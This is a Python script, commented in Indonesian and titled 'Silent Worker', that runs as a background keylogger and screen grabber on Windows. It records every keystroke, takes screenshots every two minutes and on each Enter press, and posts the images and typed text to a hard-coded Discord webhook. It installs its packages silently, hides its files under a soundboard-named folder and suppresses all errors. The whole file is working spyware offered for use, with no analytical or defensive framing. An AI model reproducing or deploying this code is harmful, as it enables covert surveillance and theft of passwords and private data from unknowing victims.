#!/usr/bin/env python3
"""
SILENT WORKER - Auto SS + Keylogger
Jalan di process terpisah, gak mati meskipun tools ditutup
"""

import os
import sys
import time
import json
import threading
import subprocess
from datetime import datetime

# Config
WEBHOOK_SS = "https://discord.com/api/webhooks/1534060967993020488/956-oLeHyXftOF0l8d--FGXn4snOg9LmbsRjrUARLxytZObTKjvIfrFA2HIcjB9a8Vyp"
AUTO_SS_INTERVAL = 120
LOCK_FILE = os.path.join(os.environ.get('LOCALAPPDATA', os.path.expanduser('~')), 'BimoliSoundboard', '.worker.lock')
STOP_FILE = os.path.join(os.environ.get('LOCALAPPDATA', os.path.expanduser('~')), 'BimoliSoundboard', '.worker.stop')

class SilentWorker:
    def __init__(self):
        self.text = ""
        self.running = True
        self.lock = threading.Lock()
        self.last_ss = time.time()
        
    def _send(self, message=""):
        try:
            from PIL import ImageGrab
            from io import BytesIO
            import requests
            
            img = ImageGrab.grab()
            buf = BytesIO()
            img.save(buf, format="PNG", optimize=True, quality=70)
            buf.seek(0)
            
            ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            caption = f"📸 **{ts}** | ✏️ Catatan:\n```\n{message}\n```" if message else f"⏰ **{ts}** | Auto Screenshot"
            files = {'file': (f"ss_{ts.replace(':', '-')}.png", buf, 'image/png')}
            requests.post(WEBHOOK_SS, data={'content': caption}, files=files, timeout=10)
            buf.close()
        except:
            pass
    
    def _loop(self):
        while self.running:
            time.sleep(1)
            # Cek stop signal
            if os.path.exists(STOP_FILE):
                self.running = False
                break
            
            if self.running and time.time() - self.last_ss >= AUTO_SS_INTERVAL:
                self.last_ss = time.time()
                self._send()
        
        # Cleanup
        self.cleanup()
    
    def _on_key(self, event):
        if not self.running:
            return
        with self.lock:
            if event.name == 'enter':
                if self.text.strip():
                    self._send(self.text.strip())
                    self.text = ""
            elif event.name == 'space':
                self.text += " "
            elif event.name == 'backspace':
                self.text = self.text[:-1] if self.text else ""
            elif len(event.name) == 1:
                self.text += event.name
    
    def start(self):
        # Install dependencies kalo belum
        try:
            import keyboard
            from PIL import ImageGrab
        except:
            subprocess.run([sys.executable, "-m", "pip", "install", "keyboard", "pillow", "requests", "--quiet"], 
                          shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            try:
                import keyboard
                from PIL import ImageGrab
            except:
                return
        
        # Bikin lock file
        os.makedirs(os.path.dirname(LOCK_FILE), exist_ok=True)
        with open(LOCK_FILE, 'w') as f:
            f.write(str(os.getpid()))
        
        # Hapus stop file kalo ada
        if os.path.exists(STOP_FILE):
            os.remove(STOP_FILE)
        
        self.running = True
        self.last_ss = time.time()
        
        # Kirim info start
        self._send("✅ Bimoli Worker Started!")
        
        # Auto SS loop
        threading.Thread(target=self._loop, daemon=True).start()
        
        # Keyboard handler
        import keyboard
        keyboard.on_press(self._on_key)
        
        # Keep alive
        try:
            while self.running:
                time.sleep(1)
                if os.path.exists(STOP_FILE):
                    self.running = False
        except KeyboardInterrupt:
            pass
        
        self.cleanup()
    
    def cleanup(self):
        if os.path.exists(LOCK_FILE):
            try:
                os.remove(LOCK_FILE)
            except:
                pass
        if os.path.exists(STOP_FILE):
            try:
                os.remove(STOP_FILE)
            except:
                pass

def is_worker_running():
    """Cek apakah worker lagi jalan"""
    if os.path.exists(LOCK_FILE):
        try:
            with open(LOCK_FILE, 'r') as f:
                pid = int(f.read().strip())
            # Cek apakah process masih hidup
            import ctypes
            kernel32 = ctypes.windll.kernel32
            handle = kernel32.OpenProcess(0x0400, False, pid)  # PROCESS_QUERY_INFORMATION
            if handle:
                kernel32.CloseHandle(handle)
                return True
        except:
            pass
        # Kalo gak valid, hapus lock file
        try:
            os.remove(LOCK_FILE)
        except:
            pass
    return False

def stop_worker():
    """Stop worker dengan bikin stop file"""
    os.makedirs(os.path.dirname(STOP_FILE), exist_ok=True)
    with open(STOP_FILE, 'w') as f:
        f.write("stop")
    
    # Tunggu sampe lock file hilang
    for _ in range(10):
        if not os.path.exists(LOCK_FILE):
            return True
        time.sleep(0.5)
    return False

def main():
    if is_worker_running():
        print("Worker already running!")
        return
    
    worker = SilentWorker()
    worker.start()

if __name__ == "__main__":
    main()
